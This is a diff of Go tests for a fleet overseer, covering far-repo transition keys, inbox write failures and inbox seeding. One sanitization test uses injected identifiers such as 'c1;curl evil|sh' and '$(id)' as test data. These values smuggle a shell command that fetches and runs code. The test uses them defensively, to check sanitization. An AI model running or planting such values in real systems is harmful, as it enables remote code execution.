@@ -482,6 +482,7 @@ func bareOverseer(out io.Writer, collect func(context.Context, io.Writer) fleetp
 		sup:      &suppress{key: map[string]string{}, ts: map[string]int64{}},
 		moves:    newTransitions(),
 		partners: map[string]*partner{},
+		inboxes:  map[string]lanepkg.FarInbox{},
 		collect:  collect,
 	}
 }
@@ -769,7 +770,7 @@ func ovDoc(ts int64, rs ...fleetpkg.RepoStatus) fleetpkg.StatusDoc {
 }
 
 func ovRepo(name string, crews ...fleetpkg.CrewStatus) fleetpkg.RepoStatus {
-	return fleetpkg.RepoStatus{Repo: "o/" + name, Common: "/git/" + name + "/.git", Crews: crews}
+	return fleetpkg.RepoStatus{Repo: "o/" + name, Common: "/git/" + name + "/.git", Key: "/git/" + name + "/.git", Crews: crews}
 }
 
 func ovCrew(id, state, attention string, workers ...map[string]any) fleetpkg.CrewStatus {
@@ -1090,6 +1091,25 @@ func TestTransitionsFilterRepoAndQueueText(t *testing.T) {
 	got = step(t, tr, withQueue(ovDoc(ovStart+minute), q, 10, 5))
 	if len(got) != 1 || got[0]["repo"] != clean || got[0]["crew"] != "c?1" || got[0]["hold"] != "h?1" {
 		t.Errorf("capacity_stuck = %v, want repo %q crew c?1 hold h?1", got, clean)
+	}
+}
+
+func TestTransitionsKeyFarRepos(t *testing.T) {
+	far := func(name string, c fleetpkg.CrewStatus) fleetpkg.RepoStatus {
+		return fleetpkg.RepoStatus{Repo: "o/" + name, Key: "/far/" + name + "/.git", Crews: []fleetpkg.CrewStatus{c}}
+	}
+	live := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "live", "attended")) }
+	down := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "dead", "unattended")) }
+	tr := newTransitions()
+	step(t, tr, ovDoc(ovStart, live("a"), live("b")))
+	if got := step(t, tr, ovDoc(ovStart+minute, down("a"), down("b"))); len(got) != 2 {
+		t.Errorf("dispatcher_down lines = %v, want one per far repo", got)
+	}
+	if got := step(t, tr, ovDoc(ovStart+2*minute, down("a"))); len(got) != 0 {
+		t.Errorf("an absent far repo re-fired: %v", got)
+	}
+	if got := step(t, tr, ovDoc(ovStart+3*minute, down("a"), down("b"))); len(got) != 0 {
+		t.Errorf("a carried-forward far key re-fired: %v", got)
 	}
 }
 
@@ -1526,6 +1546,53 @@ func TestOverseerRemoteInboxFloorFollowsTheFarClock(t *testing.T) {
 	}
 }
 
+// An inbox the lane cannot write is an error line, not a replay: the lane
+// keeps what it delivered in memory, so each pull prints only what it has not.
+func TestOverseerRemoteInboxWriteFailureDoesNotReprint(t *testing.T) {
+	v := fedOverseer(t)
+	path := lanepkg.OverseerHostInbox(v.stateDir, "mbp")
+	if err := lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}); err != nil {
+		t.Fatal(err)
+	}
+	dir := filepath.Dir(path)
+	if err := os.Chmod(dir, 0o555); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
+	if lanepkg.WriteFarInbox(path, lanepkg.FarInbox{Floor: ovStart, Seen: []string{}}) == nil {
+		t.Skip("a read-only dir is writable here")
+	}
+	ev := func(ts int64, body string) map[string]any {
+		return map[string]any{"ts": float64(ts), "kind": "msg", "body": body}
+	}
+	a1, b1 := ev(ovStart+10, "a1"), ev(ovStart+20, "b1")
+	pulls := [][]map[string]any{{a1}, {a1}, {a1, b1}, {a1, b1}}
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	n := 0
+	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		n++
+		return []fleetpkg.FarBatch{{Repo: "o/a", Common: "/git/a/.git", Cursor: ovStart + 20, Events: pulls[n-1]}}, nil
+	}
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	got := fedRun(t, v, doc(ovStart), doc(ovStart+1000), doc(ovStart+2000), doc(ovStart+3000))
+	want := [][]string{{"a1"}, nil, {"b1"}, nil}
+	for i, lines := range got {
+		if bodies := farBodies(lines); !slices.Equal(bodies, want[i]) {
+			t.Errorf("pull %d printed %q, want %q", i+1, bodies, want[i])
+		}
+	}
+	var errs []any
+	for _, l := range slices.Concat(got...) {
+		if l["stream"] == "error" {
+			errs = append(errs, l["detail"])
+		}
+	}
+	if len(errs) == 0 || !strings.HasPrefix(fmt.Sprint(errs[0]), "inbox: ") {
+		t.Errorf("error details = %v, want the inbox write failure", errs)
+	}
+}
+
 func TestOverseerLinesSanitizeFarIdentifiers(t *testing.T) {
 	const evil = "c1;curl evil|sh"
 	abandoned := ovWorker("worker:feat/$(id)#s1", "failed")
@@ -1617,8 +1684,13 @@ func (r *farRig) pull(t *testing.T, v *overseer) []string {
 	var out lockedWriter
 	v.out = &laneWriter{w: &out, now: time.Now}
 	v.diff(t.Context())
+	return farBodies(decodeLinesT(t, out.str()))
+}
+
+// farBodies are the bodies of the far replies among lines.
+func farBodies(lines []map[string]any) []string {
 	var bodies []string
-	for _, l := range decodeLinesT(t, out.str()) {
+	for _, l := range lines {
 		events, _ := l["events"].([]any)
 		for _, e := range events {
 			ev, _ := e.(map[string]any)
@@ -1705,6 +1777,68 @@ func TestOverseerRemoteRedeliversAfterFailedFlush(t *testing.T) {
 	}
 	if got := r.pull(t, v); len(got) != 0 {
 		t.Errorf("pull 4 printed %q, want nothing", got)
+	}
+}
+
+// An inbox file the lane can no longer write holds --since below the lane's
+// floor; the older replies that pull brings back are not printed again.
+func TestOverseerRemoteStaleInboxFileReplaysNothing(t *testing.T) {
+	r := newFarRig(t)
+	r.far.Repo("a")
+	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
+	v := r.lane(t)
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Fatalf("pull 1 printed %q, want a1", got)
+	}
+	path := lanepkg.OverseerHostInbox(r.state, "mbp")
+	dir := filepath.Dir(path)
+	if err := os.Chmod(dir, 0o555); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
+	if lanepkg.WriteFarInbox(path, farInbox(t, r.state)) == nil {
+		t.Skip("a read-only dir is writable here")
+	}
+	advance := func() {
+		r.far.Advance(2 * time.Minute)
+		r.clock.advance(2 * time.Minute)
+	}
+	advance()
+	r.far.Append("a", fleettest.Reply(r.far.Now()-5_000, "c1", ovHost, "b1"))
+	if got := r.pull(t, v); !slices.Equal(got, []string{"b1"}) {
+		t.Errorf("pull 2 printed %q, want b1", got)
+	}
+	advance()
+	if got := r.pull(t, v); len(got) != 0 {
+		t.Errorf("pull 3 printed %q, want nothing", got)
+	}
+}
+
+// A partner's first sight seeds its inbox at the lane's start before any
+// flush, so the pull after it asks from there, not from the fallback window,
+// even when the first batch missed the wire.
+func TestOverseerRemoteSeedsPartnerInboxAtTheLaneStart(t *testing.T) {
+	r := newFarRig(t)
+	r.far.Repo("a")
+	r.far.Append("a", fleettest.Reply(r.far.Now()-10_000, "c1", ovHost, "a1"))
+	serve := r.far.Serve()
+	var sinces []string
+	r.opts.Federate = func(ctx context.Context, host string, argv []string, stdout, stderr io.Writer) int {
+		sinces = append(sinces, argv[len(argv)-1])
+		return serve(ctx, host, argv, stdout, stderr)
+	}
+	v := r.lane(t)
+	r.flush = func() error { return errors.New("pipe") }
+	r.pull(t, v)
+	if in := farInbox(t, r.state); in.Floor != ovStart || len(in.Seen) != 0 {
+		t.Errorf("inbox after the first diff = %+v, want floor %d and no keys", in, ovStart)
+	}
+	r.flush = nil
+	if got := r.pull(t, v); !slices.Equal(got, []string{"a1"}) {
+		t.Errorf("pull 2 printed %q, want a1", got)
+	}
+	if len(sinces) != 2 || sinces[1] != fmt.Sprint(ovStart) {
+		t.Errorf("--since of each pull = %q, want the second at the lane start %d", sinces, ovStart)
 	}
 }
 
